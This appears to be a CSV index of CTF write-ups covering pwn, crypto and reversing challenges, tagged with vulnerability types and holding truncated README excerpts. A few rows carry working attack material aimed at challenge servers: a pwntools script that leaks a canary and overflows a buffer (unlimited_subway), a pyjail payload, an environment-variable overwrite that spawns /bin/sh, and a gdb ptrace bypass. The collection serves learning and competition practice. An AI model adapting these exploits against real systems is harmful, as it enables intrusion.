dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,writeups-10,writeups,blaze-ctf-2018/pwn/shellcodeme/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=exploit) [](tags=game) [](techniques=shellcode) # shellcodeme (pwn-420) ``` Can you please smoke this? nc shellcodeme.420blaze.in 420 Author : aweinstock Solves : ~60 ``` This challenge had a hard version too. The way I exploited this chall worked in the hard one too. So 2 flags for the work of one. Source code was provided. ```c // gcc -zexecstack -Os shellcodeme.c -o shellcodeme #include <stdio.h> #include <string.h> #include <sys/mman.h> #include <unistd.h> #define BUF_SIZE (0x4096 & ~(getpagesize()-1)) int main() { setbuf(stdout, NULL); unsigned char seen[257], *p, *buf; void (*f)(void); memset(seen, 0, sizeof seen); buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); puts(""Shellcode?""); fgets(buf, BUF_SIZE, stdin); fflush(stdin); for(p=buf; *p != '\n'; p++) { seen[256] += !seen[*p]; seen[*p] |= 1; } if(seen[256] > 7) { puts(""Shellcode too diverse.""); _exit(1); } else { *(void**)(&f) = (void*)buf; f(); _exit(0); } } ``` 4 rwx pages are mmaped on which we can copy our input(0x4000). The only catch is the shellcode can't contain more than 7 unique bytes. ```c for(p=buf; *p != '\n'; p++) { seen[256] += !seen[*"
ctf_writeup,writeups-11,writeups,asis-ctf-quals-2017/pwn/fu-interpreter/sudhackar/README.md,sudhackar,format_string,"[](ctf=asis-ctf-quals-2017) [](type=exploit) [](tags=brainfuck) [](tools=pwntools) [](techniques=GOT overwrite) # Fu interpreter (pwn-101) We are given a [file](../fulang_e62955ff8cc20de534a29321b80fa246ddf9763f). ```bash $ file fulang_e62955ff8cc20de534a29321b80fa246ddf9763f fulang_e62955ff8cc20de534a29321b80fa246ddf9763f: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=746b0bdb7782ec102b56e6b27507d264920be051, not stripped $ checksec ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f [*] '/tmp/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ``` The file is not stripped, so the decompilation is quite neat. There are only two functions of interest *main* and *fu_interpreter*. ```c int fu_interpreter(char a1, char a2) { _BYTE *v2; // ebx@13 char v3; // dl@15 signed int result; // eax@20 if ( a1 == ':' ) { if ( a2 == '<' ) --fu; if ( a2 == '>' ) ++fu; if ( a2 == '+' ) ++*(_BYTE *)fu; if ( a2 == '-' ) --*(_BYTE *)fu; if ( a2 == ':' ) putchar(*(_BYTE *)fu); if ( a2 == '.' ) { v2 = (_BYTE *)fu; *v2 = ge"
ctf_writeup,writeups-12,writeups,hack.lu-ctf-2015/coding/GuessTheNumber/sudhackar/README.md,sudhackar,format_string,"[](ctf=hack.lu-2015) [](type=coding) [](tags=random) # GuessTheNumber (coding-150) ``` The teacher of your programming class gave you a tiny little task: just write a guess-my-number script that beats his script. He also gave you some hard facts: he uses some LCG with standard glibc LCG parameters the LCG is seeded with server time using number format YmdHMS (python strftime syntax) numbers are from 0 up to (including) 99 numbers should be sent as ascii string You can find the service on school.fluxfingers.net:1523 ``` ```bash $ nc school.fluxfingers.net 1523 Welcome to the awesome guess-my-number game! It's 22.10.2015 today and we have 13:01:49 on the server right now. Today's goal is easy: just guess my 100 numbers on the first try within at least 30 seconds from now on. Ain't difficult, right? Now, try the first one: 99 Wrong! You lost the game. The right answer would have been '61'. Quitting. ``` So here we have a random number generator and we have to guess 100 numbers on the server. Searching about LCG we land on [this](http://rosettacode.org/wiki/Linear_congruential_generator#C) page. The seed is given by the server in the message.It is the standard rand_r function in glibc "
ctf_writeup,writeups-13,writeups,hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=hack.lu-2015) [](type=exploiting,pwn) [](tags=buffer-overflow) [](tools=gdb-peda,pwntools) [](techniques=ROP) # Stackstuff (Exploiting 150) We have an [archive](../stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3.tar.gz). On extracting ```bash $ file * hackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped hackme.c: C source, ASCII text ``` We have source of the executable. ```c int check_password_correct(void) { char buf[50] = {0}; puts(""To download the flag, you need to specify a password.""); printf(""Length of password: ""); int inlen = 0; if (scanf(""%d\n"", &inlen) != 1) { // peer probably disconnected? exit(0); } if (inlen <= 0 || inlen > 50) { // bad input length, fix it inlen = 90; } if (fread(buf, 1, inlen, stdin) != inlen) { // peer disconnected, stop exit(0); } return strcmp(buf, real_password) == 0; } void require_auth(void) { while (!check_password_correct()) { puts(""bad password, try again""); } } void handle_request(void) { alarm(60); setbuf(stdout, NULL); FILE *realpw_file = fopen(""password"", ""r""); if (r"
ctf_writeup,writeups-14,writeups,hack.lu-ctf-2015/crypto/Creative Cheating/sudhackar/README.md,sudhackar,other,"[](ctf=hack.lu-2015) [](type=crypto) [](tags=rsa) # Creative Cheating (crypto-150) We have a [pcapng](../dump_2bd6da8de87c6f1170dec710f7268a16.pcapng). Opening it with wireshark we see data packets. Follow the stream and extract it to a [file](str). We see the data is base64'd. ```bash cat str | base64 -d > full ``` each line has data in this format. ``` SEQ = 00; DATA = 0x19688f112a61169c9090a4f9918dL; SIG = 0x1448ac6eee2b2e91a0a6241e590eL; ``` What we can conclude is that DATA is the actual ciphertext which was sent to Bob (192.168.0.37). DATA was encrypted using public key of Bob. So we hit factor-db and generate private key for BOB to decrypt data. ```python >>> p=49662237675630289 >>> q=62515288803124247 >>> s=(p-1)*(q-1) >>> n=3104649130901425335933838103517383 >>> p*q==n True >>> e=0x10001 >>> d=modinv(e,s) >>> d 1427000713644866747260499795119265L >>> arr=[0x19688f112a61169c9090a4f9918d,0x50d31689fa2c33f1d5ca0dad9eda,0x50d31689fa2c33f1d5ca0dad9eda,0x59e9bb001b0d9167dbc39dd544c9,0x633282273f9cf7e5a44fcbe1787b,0x7492f4ec9001202dcb569df468b4,0x13a5bbd5163bdf483542906c5bf,0x23d28a636bf59c450ca3a2b0ac13,0x292ffa2958c1318f687dd9ec5d12,0x41c66817dcc70c5cfefa5ac8af9d,0xa02a43cdf9aa"
ctf_writeup,writeups-15,writeups,mma-ctf-2016/pwn/greeting/sudhackar/README.md,sudhackar,format_string,[](ctf=mma-ctf-2016) [](type=exploit) [](tags=format string) [](tools=libformatstr) [](techniques=format string) # greeting (pwn-150) [Binary](../greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c) [Solution](greeting.py) [![asciicast](https://asciinema.org/a/0e7jitfip9k5n7ir4bbw0xp0d.png)](https://asciinema.org/a/0e7jitfip9k5n7ir4bbw0xp0d)
ctf_writeup,writeups-16,writeups,mma-ctf-2016/crypto/twin-primes/sudhackar/README.md,sudhackar,other,"[](ctf=mma-ctf-2016) [](type=crypto) [](tags=RSA) [](tools=gmpy) [](techniques=factorisation,shreedharacharya) # twin-primes (crypto-50) [Zip](../twin-primes.7z-39a1a147cbf55d4d944f8eacdbdf4ee7a967dd70ef0eaaa0a1cee5c58c641483) [Solution](twin-primes.py)"
ctf_writeup,writeups-17,writeups,mma-ctf-2016/crypto/super-express/sudhackar/README.md,sudhackar,other,[](ctf=mma-ctf-2016) [](type=crypto) [](tags=substitution) [](tools=) [](techniques=brute force) # super-express (crypto-100) [Binary](../super_express.7z-eae5a801032c7b6866aa790ad11c7a30c133b160df4997e2323fead2ec7fe15a) [Solution](decrypt.py)
ctf_writeup,writeups-18,writeups,tum-ctf-2016/pwn/lolcpp/sudhackar/README.md,sudhackar,other,[](ctf=tum-ctf-2016) [](type=exploit) [](tags=bof) [](tools=pwntools) [](techniques=) # lolcpp (pwn-250) [Binary](../lolcpp.tar.gz) [Solution](lolcpp.py) [![asciicast](https://asciinema.org/a/87835.png)](https://asciinema.org/a/87835)
ctf_writeup,writeups-19,writeups,inferno-ctf-2019/pwn/treat/vn-ki/README.md,vn-ki,command_injection,"# Treat Me #### Category: pwn #### Points: 200 Let's, check the binary. ``` $ checksec ./treat [*] '/home/vn-ki/ctf/inferno/treat/treat' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ``` Reversing the binary, we see there are 3 inputs. 1. Our name, stored in `.bss`, i.e. we know the address of this without leaking. 2. Choice, this is a buffer on the stack. 3. Feedback, this is the same buffer as 2. All the inputs are taken using a custom function which will terminate the input at null and newline. I initally thought of a ret2plt, but the null characters will be a problem. Inspecting more we discover another function. ```c void FUN_00401186(void) { char *__command; puts(""You want some special treat?\nHere you go""); __command = getenv(""TREAT""); system(__command); return; } ``` Well, well, well, what do we have here. This function calls system on the environment variable TREAT. The attack vector is quite clear now. Overwrite the environment variables on the stack to point to TREAT=/bin/sh. For that we have to find how far away the first environment variable is. ``` pwndbg> x/gx (char **)environ 0x7fffffffdea8: 0x00007fffffffe21"
ctf_writeup,writeups-20,writeups,inferno-ctf-2019/rev/webcrackme/vn-ki/README.md,vn-ki,command_injection,"# Web Crackme #### Category: rev #### Pts: 399 http://104.197.168.32:17030/#challenge Looking at sources, we see some code is constructed and evaled and there are 2 wasm functions. ```js async execute() { var key = document.getElementById('key').value; var stringFromKey = """"; for (var i = 0; i < key.length; i++) { stringFromKey+=key.charCodeAt(i).toString(16); } const parsedWat = wabtCompiler.parseWat("""", this.wat); const buffer = parsedWat.toBinary({}).buffer; const wasmModule = await WebAssembly.compile(buffer); eval(this.js); return 0; } ``` Put a breakpoint in one of the function and enter some input. Go up the call stack. We will see the generated evaled script. ```js const wasmInstance = new WebAssembly.Instance(wasmModule, {}); const { myFunction1,myFunction2 } = wasmInstance.exports; let res1 = myFunction1().toString(16); let res2 = myFunction2().toString(16); let finalres = res1 + res2; if (finalres == stringFromKey){ alert(""Here you go infernoCTF{""+key+""}""); } else{ alert(""Naah, Remember I'm the future!!""); } ``` In the console, check the variable `finalres` ``` >finalres ""665579592d4d6539"" ``` Converting to ascii, we get the flag."
ctf_writeup,writeups-21,writeups,inferno-ctf-2019/rev/darkcrackme/vn-ki/README.md,vn-ki,format_string,"# darcrackme #### Category: rev #### Points: 200 The binary asks for username and password when we run it. ``` ./darkcrackme ||============================================|| || DARK ARMY SAFE v2.0 || ||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|| || || | | | / / (\-""```""-/) \ \ | | / / //^\ /^\\ \ \ | | / / ;/ ~_\ /_~ \; \ \ | | / / | / \Y/ \ | \ \ | | | | (, \0/ \0/ ,) | | | | \ \ | / \ | / / | | \ \ | (_\._./_) | / / | | \ \ )|\ \v-.-v/ /|( / / | | \ \ / ) \ `===' / ( \ / / | | """""" """""" | ||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|| || Only the top 1% of the 1% can crack me! || ||============================================|| Username :: asd Password :: as ``` Opening the binary in ghidra, we see, ```c iVar1 = strcmp(username,""1_4m_th3_wh1t3r0s3""); if (iVar1 == 0) { iVar1 = FUN_004013f9(username,password); if (iVar1 == 1) { puts(""\nAuthorised!!""); printf(""Here is my Dark Secret : infernoCTF{%s}\n"",local_e8); } else { puts(""\nAre you trying to pwn the pwners""); } } ``` Our username and password is the parameters to a function. When we look inside the function, we see that another string is constructed using our password and is check against the username. The function roughly "
ctf_writeup,writeups-22,writeups,trend-micro-ctf-2015/prog/click-on-the-different-color/chaitan94/README.md,chaitan94,other,"[](ctf=trend-micro-ctf-2015) [](type=prog) [](tags=) [](tools=PIL) [](techniques=) # Click on the different color (prog-100) Problem statement is straightforward. We are given a square grid: ![Squares](../squares.png) We have to click on the tile which has the odd color. After each such click, the grid gets larger and larger. Obviously, we need to automate this, so wrote down a [quick script](bot.py), and let it play for a few minutes. After our bot plays for about 80 levels, we get the flag: > TMCTF{U must have R0807 3Y3s!}"
ctf_writeup,writeups-23,writeups,trend-micro-ctf-2015/prog/calculator/chaitan94/README.md,chaitan94,format_string,"[](ctf=trend-micro-ctf-2015) [](type=prog) [](tags=roman,parsing) [](tools=) [](techniques=) # Calculator (prog-200) Again, problem is simple: We're given simple arithmetic questions, we need to calculate their values. In the start, it's quite simple as the questions contained just numbers and operators. Python's `eval()` would've been more than enough, but as level increase, we get numbers separated by commas (like 62,234,612). Even more, we start to see roman numerals (CMXIV), and finally even numbers in plain english! (six hundred twenty two). To automate this, we wrote a python script which after reading each question, does the following: ```python def solve(ques): # We only need lhs ques = ques.split(""="")[0] # We don't need commas ques = ques.repace(',', '') parsed = '' # Let's separate parts between operators groups = re.split('([\-\+\*\/\(\)])', ques) # Convert each part to a number for g in groups: g = g.strip() # If part a roman numeral, convert it to decimal if re.match('([A-Z]+)', g): parsed += ""%s"" % roman.fromRoman(g) # If part is in plain english, convert it to decimal elif re.match('([a-z]+)', g): parsed += ""%s"" % text2int(g) else: parsed += g # Now eval can do the r"
ctf_writeup,writeups-24,writeups,trend-micro-ctf-2015/analysis/defensive-100/sudhackar/README.md,sudhackar,command_injection,"[](ctf=trend-micro-ctf-2015) [](type=analysis,reverse) [](tags=payload,drop) [](tools=gdb-peda) [](techniques=breakpoints) I think this is the unintended solution. We are given a [zip](../vonn.zip) password:wx5tOCvU3g2FmueLEvj5np9xJX0cND3K. This gives us a binary. ```sh $ file vonn vonn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7f89c2bb36cc9d0882a4980a99d44a7674fb09e2, not stripped $ ./vonn You are not on VMM ``` Thats it! we don't know whats happening. So i quickly load it with gdb-peda and after setting some breakpoints,we're ready to step through the execution. ```sh gdb-peda$ b *0x400b8d Breakpoint 1 at 0x400b8d ``` After some stepping when we get to puts call for output ```objdump 0x400cd3 <main+326>: cmp rax,QWORD PTR [rbp-0x8] 0x400cd7 <main+330>: je 0x400cfc <main+367> 0x400cd9 <main+332>: mov edi,0x401100 => 0x400cde <main+337>: call 0x400990 <puts@plt> 0x400ce3 <main+342>: mov rax,QWORD PTR [rbp-0xd0] 0x400cea <main+349>: mov rax,QWORD PTR [rax] 0x400ced <main+352>: mov rdi,rax 0x400cf0 <main+355>: mov eax,0x0 Guessed arguments: arg[0]: 0x401100 (""You are on VMM!"")"
ctf_writeup,writeups-25,writeups,trend-micro-ctf-2015/crypto/crypto-100/chaitan94/README.md,chaitan94,other,"[](ctf=trend-micro-ctf-2015) [](type=crypto) [](tags=rsa) [](tools=factordb,rsatool,openssl) [](techniques=rsa) # crypto-100 Problem description > You're given an RSA public key and an encrypted message which contains a flag. Get the flag. > > There's also a hint about ""1bit"" being wrong in the public key. > > message: kPmDFLk5b/torG53sThWwEeNm0AIpEQek0rVG3vCttc= So lets go ahead and get the modulus (n) and exponent (e) from the given [public key](../PublicKey.pem) ```bash $ openssl rsa -pubin -inform PEM -text -noout < PublicKey.pem Public-Key: (256 bit) Modulus: 00:b6:2d:ce:9f:25:81:63:57:23:db:6b:18:8f:12: f0:46:9c:be:e0:cb:c5:da:cb:36:c3:6e:0c:96:b6: ea:7b:fc Exponent: 65537 (0x10001) ``` n's value in base 10 is 82401872610398250859431855480217685317486932934710222647212042489320711027708 Hmm, n is even? Question says 1 bit is wrong.. it has to be last bit! So, n must be 82401872610398250859431855480217685317486932934710222647212042489320711027709 Lets try http://www.factordb.com/index.php?query=82401872610398250859431855480217685317486932934710222647212042489320711027709 Perfect! Got p and q. Let's generate private key and decrypt ```bash $ python2 rsatool.py -f PEM -o private"
ctf_writeup,writeups-26,writeups,csaw-quals-2023/pwn/super_secure_heap/sudhackar/README.md,sudhackar,heap,[](ctf=csaw-quals-2023) [](type=pwn) [](tags=heap) [](tools=pwntools) # [Super Secure Heap](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/super_secure_heap) It crashes on last stage on remote for some reason Debugged it in docker. Looks like a stack alignment issue. ```sh $ cat flag.txt [DEBUG] Sent 0xd bytes: b'cat flag.txt\n' [DEBUG] Received 0x2d bytes: b'csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?}\n' csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?} ``` Actually solved this chall without a debugger 🙂 ## Script [`solve.py`](./solve.py)
ctf_writeup,writeups-27,writeups,csaw-quals-2023/pwn/unlimited_subway/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2023) [](type=pwn,rev) [](tags=buffer-overflow,canary) [](tools=pwntools,ida) ```py from pwn import * context.log_level = ""debug"" context.binary = ""./unlimited_subway"" def get(p, idx): p.recvuntil('> ') p.sendline('V') p.recvuntil(': ') p.sendline(str(idx)) p.recvuntil(': ') b = int(p.recvline(), 16) return b def exploit(): p = remote('pwn.csaw.io', 7900) # nc pwn.csaw.io 7900 x = get(p, 128) assert(x==0) canary = 0 canary |= (get(p, 129) << 8) canary |= (get(p, 130) << 16) canary |= (get(p, 131) << 24) payload = b'A'*0x40+p32(canary)+p32(0xdeadbeef)+p32(context.binary.symbols[""print_flag""]) p.recvuntil('> ') p.sendline('E') p.recvuntil(': ') p.sendline(str(len(payload))) p.recvuntil(': ') p.sendline(payload) print(p.recvall()) p.close() if __name__ == ""__main__"": exploit() ''' [+] Receiving all data: Done (58B) [DEBUG] Received 0x3a bytes: 'csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}\n' [*] Closed connection to pwn.csaw.io port 7900 csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3} ''' ```"
ctf_writeup,writeups-28,writeups,csaw-quals-2023/pwn/unlimited_subway/gjain-7/README.md,gjain-7,other,"[](ctf=csaw-quals-2023) [](type=pwn,rev) [](tags=buffer-overflow,canary) [](tools=pwntools,ida) # [Unlimited Subway](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/unlimited_subway) Given a binary. ```sh csaw23/Subway » checksec --file=/usr/bin/cat 2 ↵ Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ``` Doing a quick checksec, notice that it has canary. Having a look on the [decompiled binary](./dec.c) we need to call `print_flag()`. We have control over input buffer, so we need to overflow the frame pointer, with the `print_flag` address. But doing so would also corrupt the canary, so first we need to leak the canary exploting ubnounded reads through `view_account`. ## Script [`sol.py`](./sol.py) flag: `csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}`"
ctf_writeup,writeups-29,writeups,csaw-quals-2023/rev/rox/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2023) [](type=rev) [](tags=) [](tools=) This is the source for rox that I rewrote. [`food.py`](./food.py) If one can invert the logic in test such that test returns 74 - that would be the solution to it. I did try a sidechannel but was not able to get the flag fully The flag looks something like `aN0ther_HeRRing_or_.....` ```sh osboxes@osboxes:~ $ python3 /tmp/else.py aN0ther_HeRRing_or_i (20, 'i') aN0ther_HeRRing_or_ir (21, 'r') aN0ther_HeRRing_or_irh (22, 'h') aN0ther_HeRRing_or_irht (23, 't') aN0ther_HeRRing_or_irhtH (24, 'H') aN0ther_HeRRing_or_irhtH3 (25, '3') aN0ther_HeRRing_or_irhtH3e (26, 'e') aN0ther_HeRRing_or_irhtH3ew (27, 'w') aN0ther_HeRRing_or_irhtH3ewi (28, 'i') aN0ther_HeRRing_or_irhtH3ewiT (49, 'T') aN0ther_HeRRing_or_irhtH3ewiTn (30, 'n') aN0ther_HeRRing_or_irhtH3ewiTn0 (30, '0') aN0ther_HeRRing_or_irhtH3ewiTn00 (30, '0') ``` I wasted doing a sidechannel on the binary without any promising results These are the sidechannel I tried with gdb but without any luck.\ [`some.py`](./some.py), [`else.py`](./else.py) flag: `aN0ther_HeRRing_or_iS_tHis_iT`"
ctf_writeup,writeups-30,writeups,csaw-quals-2023/rev/Impossibrawler/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2023) [](type=pwn,rev) [](tags=buffer-overflow,canary) [](tools=pwntools,ida) # [Impossibrawler](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/rev/Impossibrawler!) decompilation for `impossibrawler` ```js extends Node2D var totalenemies = 0 var rng = RandomNumberGenerator.new() var enemies_left = 0 func _process(delta): var mousepos = get_global_mouse_position() get_node(""Crosshair"").position = mousepos if enemies_left == 0: rng.seed = int(Vals.sd) var fbytes = rng.randf() Vals.sd = fbytes fbytes = str(fbytes) var flg = fbytes.to_ascii().hex_encode() $CanvasLayer / Label.set_text(""csawctf{"" + flg + ""}"") func _on_Enemy_killed(): enemies_left -= 1 func _on_Enemy_alive(): totalenemies += 1 enemies_left += 1 func _ready(): Input.set_mouse_mode(Input.MOUSE_MODE_HIDDEN) ``` It is static analysis only. Tried this ```js extends Node2D var totalenemies = 0 var rng = RandomNumberGenerator.new() var enemies_left = 0 func _process(delta): var mousepos = get_global_mouse_position() get_node(""Crosshair"").position = mousepos if enemies_left == 0: rng.seed = Vals.hits ^ enemies_left ^ Vals.playerdmg var fbytes = rng.randf() Vals.sd = fbytes get_tree().change_scene(""r"
ctf_writeup,writeups-31,writeups,csaw-quals-2023/crypto/Mental Poker/gjain-7/README.md,gjain-7,other,"[](ctf=csaw-quals-2023) [](type=crypto) [](tags=bruteforce,rsa,PRNG) [](tools=pwntools) # [Mental Poker](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/crypto/mental-poker) Given a `server.py` which is simulating a poker game. In order to win the flag one needs to continously win with a streak of 10. We have the control to shuffle the cards(encrypted) and player keys (`player_e` and `player_d`). The latter do not matter if we simply set them to `1`. Moving on, If we notice the `PRNG` implementation, in the state generation, only last 10 bits of `state.seed` are being used. ```py class PRNG: def __init__(self, seed = int(os.urandom(8).hex(),16)): self.seed = seed self.state = [self.seed] self.index = 64 for i in range(63): self.state.append((3 * (self.state[i] ^ (self.state[i-1] >> 4)) + i+1)%64) ``` We can then bruteforce the seed and find out the correct seed. To check the if a seed correct we decrpyt the cards using the private key derived from the seeds and check if the card name is sensible. Once we find the `computer_e`, we arrange the cards in the winning order and send the encrypted versions back. ## Script [`sol.py`](./sol.py) flag: `csawctf{m3n74l_p0k3r_15_4n_1"
ctf_writeup,writeups-32,writeups,csaw-quals-2023/misc/stonk/gjain-7/README.md,gjain-7,other,"[](ctf=csaw-quals-2023) [](type=misc) [](tags=python,implementation-gap) [](tools=) # [Stonks](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/misc/TradingGame) Given an implementation of a trading platform, one has 2000 balance and needs 9000 to buy the flag. One can do following operations: - buy a stock - sell a stock - trade a stock, with any lower valued stock. ### Finding gap ```py def threadTransact(): global QUEUE global TRADEPOST bkup = dict() while True: if QUEUE: key, action, s1, s2 = QUEUE.popleft() p = DB.getInstance().getUser(key) #process trading by posting trade request #onto the classified if action == 3: if(postTrade(key, s1)): TRADEPOST.append((key, s1, s2)) #money related actions is very costly to the server, #throttle if the user has more than 1 requests per second #over 10 second survey period if p.requests > 10: #Throttling, ignore request and attempts to restore if key in bkup: p = DB.getInstance().getUser(key) p.balance = bkup[key].balance p.requests = bkup[key].requests p.portfolio = bkup[key].portfolio continue bkup[key] = Portfolio.bkup(key, p.portfolio, p.balance, p.requests) if action == 1: buyDB(key, s1) elif action == 2: sellDB(key, s1) ``"
ctf_writeup,writeups-33,writeups,csaw-quals-2023/misc/AdminDiscordBot/AniRude/README.md,AniRude,other,"[](ctf=csaw-quals-2023) [](type=misc) [](tags=pyjail) [](tools=) # [Admin Discord Bot](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/misc/AdminDiscordBot) 1. To get flag we need have to `admin` role, so make your own server where you have that role and invite the bot. 2. Second part is a pyjail. We did it with following payload ``` !add list(open(\""flag.txt\"")) ``` ``` Dentaku BOT: ['csawctf{Y0u_4r3_th3_fl4g_t0_my_pyj4il_ch4ll3ng3}\n'] ```"
ctf_writeup,writeups-34,writeups,csaw-quals-2023/misc/android-dropper/sudhackar/README.md,sudhackar,rop,"[](ctf=csaw-quals-2023) [](type=misc) [](tags=android,java) [](tools=) ```java /* package whatever; // don't place package name! */ import java.util.*; import java.lang.*; import java.io.*; /* Name of the class has to be ""Main"" only if the class is public. */ class Ideone { static byte[] notTheFlag; public static void main (String[] args) throws java.lang.Exception { String str = ""bEVYCkNEWV5LRElPBgpFRApeQk8KWkZLRE9eCm9LWF5CBgpHS0QKQktOCktGXUtTWQpLWVlfR09OCl5CS14KQk8KXUtZCkdFWE8KQ0ReT0ZGQ01PRF4KXkJLRApORUZaQkNEWQpIT0lLX1lPCkJPCkJLTgpLSUJDT1xPTgpZRQpHX0lCCgcKXkJPCl1CT09GBgpkT10Kc0VYQQYKXUtYWQpLRE4KWUUKRUQKBwpdQkNGWV4KS0ZGCl5CTwpORUZaQkNEWQpCS04KT1xPWApORURPCl1LWQpHX0lBCktIRV9eCkNECl5CTwpdS15PWApCS1xDRE0KSwpNRUVOCl5DR08ECmhfXgpJRURcT1hZT0ZTBgpJWUtdSV5MUU5TRB5HG0l1RkUeTk94WXVYdUxfZAtXIF5CTwpORUZaQkNEWQpCS04KS0ZdS1NZCkhPRkNPXE9OCl5CS14KXkJPUwpdT1hPCkxLWApHRVhPCkNEXk9GRkNNT0ReCl5CS0QKR0tECgcKTEVYClpYT0lDWU9GUwpeQk8KWUtHTwpYT0tZRURZBA==""; notTheFlag = Base64.getDecoder().decode(str); System.out.println(obf(275, 306, 42)); // your code goes here } public static String obf(int i, int i2, int i3) { int i4 = i2 - i; char[] cArr = new char[i4]; for (int i5 = 0; i5 < i4; i5++) { cArr[i5] = (ch"
ctf_writeup,writeups-35,writeups,defcamp-quals-2015/reverse/r100/sudhackar/README.md,sudhackar,command_injection,"[](ctf=defcamp-quals-2015) [](type=reverse) [](tags=shift-cipher) We are given a [binary](../r100.bin). ```bash $ file r100.bin r100.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=0f464824cc8ee321ef9a80a799c70b1b6aec8168, stripped ``` On running it asks for a password and checks it. ```bash $ ./r100.bin Enter the password: AAAAAA Incorrect password! ``` A quick strace shows its protected from debugging using [ptrace](https://en.wikipedia.org/wiki/Ptrace). ```bash $ strace ./r100.bin . . ptrace(PTRACE_TRACEME, 0, 0, 0) = -1 EPERM (Operation not permitted) ``` So gdb won't work normally. The technique I used involved changing the return value in runtime during gdb debugging. ```bash $ objdump -d sep_15/d-ctf/r100.bin | grep \<ptrace@plt\> 0000000000400600 <ptrace@plt>: 4007da: e8 21 fe ff ff callq 400600 <ptrace@plt> ``` ```bash gdb-peda$ b *0x4007df Breakpoint 1 at 0x4007df gdb-peda$ r . . gdb-peda$ set $rax=0 ``` This will do the job. Now back to reversing. A brief decompilation gives us ```c int check(char *input) { int i; char p1[8] = ""Dufhbmf""; // [bp-20h] char p2[8] = ""pG"
